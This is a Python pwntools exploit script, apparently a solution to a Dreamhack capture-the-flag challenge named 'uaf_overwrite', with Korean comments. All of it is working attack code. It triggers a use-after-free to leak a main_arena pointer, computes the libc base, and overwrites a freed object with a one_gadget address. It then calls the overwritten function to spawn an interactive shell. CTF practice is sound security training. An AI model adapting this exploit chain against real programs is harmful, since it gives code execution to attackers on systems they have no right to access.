from pwn import *

#p = remote("host3.dreamhack.games", 19957)
p = process("./uaf_overwrite")
e = ELF("./uaf_overwrite")
libc = ELF("./libc-2.27.so")

def custom(size, data, idx):
    p.sendlineafter(b">", b"3")
    p.sendlineafter(b": ", str(size))
    p.sendafter(b": ", data)
    p.sendlineafter(b": ", str(idx))

def human(weight, age):
    p.sendlineafter(b">", b"1")
    p.sendlineafter(b": ", str(weight))
    p.sendlineafter(b": ", str(age))

def robot(weight):
    p.sendlineafter(b">", b"2")
    p.sendlineafter(b": ", str(weight))
    

custom(0x500, b"AAAA", 100)
custom(0x500, b"AAAA", 100) #동시에 두 개 할당(idx = -1이면 해제하지 않음)
custom(0x500, b"AAAA", 0) #처음 할당한 거 해제
custom(0x500, b"B", 100) #재할당

main_arena = u64(p.recvline()[:-1].ljust(8, b"\x00")) 
libc_base = main_arena - libc.sym['__malloc_hook'] - 0x10 - 0x2
print(hex(libc_base))

one_gadget = [0x4f3d5, 0x4f432, 0x10a41c]
oneshot = libc_base + one_gadget[2]
#pause()
human(1 , oneshot)

robot(1)

p.interactive()